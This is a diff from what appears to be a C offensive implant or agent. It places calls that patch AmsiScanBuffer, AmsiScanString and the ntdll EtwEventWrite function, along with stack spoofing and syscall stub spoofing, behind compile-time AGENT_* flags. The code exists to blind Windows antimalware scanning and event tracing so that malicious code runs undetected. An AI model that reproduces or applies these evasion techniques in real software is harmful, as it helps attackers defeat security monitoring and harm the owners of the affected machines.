@@ -480,15 +480,23 @@ void *spoof_syscall_stub(unsigned short ssn) {
 }
 
 void amsi_bypass(void) {
-    patch_fn("amsi.dll",  "AmsiScanBuffer");
-    patch_fn("amsi.dll",  "AmsiScanString");
+#ifdef AGENT_AMSI_BYPASS
+    patch_fn("amsi.dll", "AmsiScanBuffer");
+    patch_fn("amsi.dll", "AmsiScanString");
+#endif
+#ifdef AGENT_ETW_BYPASS
     patch_fn("ntdll.dll", "EtwEventWrite");
+#endif
 }
 
 void evasion_init(void) {
-    patch_fn("amsi.dll",  "AmsiScanBuffer");
-    patch_fn("amsi.dll",  "AmsiScanString");
+#ifdef AGENT_AMSI_BYPASS
+    patch_fn("amsi.dll", "AmsiScanBuffer");
+    patch_fn("amsi.dll", "AmsiScanString");
+#endif
+#ifdef AGENT_ETW_BYPASS
     patch_fn("ntdll.dll", "EtwEventWrite");
+#endif
 
     HMODULE ntdll = GetModuleHandleA("ntdll.dll");
     g_NtDelay = (NtDelay_t)GetProcAddress(ntdll, "NtDelayExecution");
@@ -522,7 +530,9 @@ void evasion_init(void) {
     }
 #endif /* mode >= 1 */
 
+#ifdef AGENT_STACK_SPOOF
     init_stack_spoof();
+#endif
 }
 
 /* ══════════════════════════════════════════════════════════════════════════
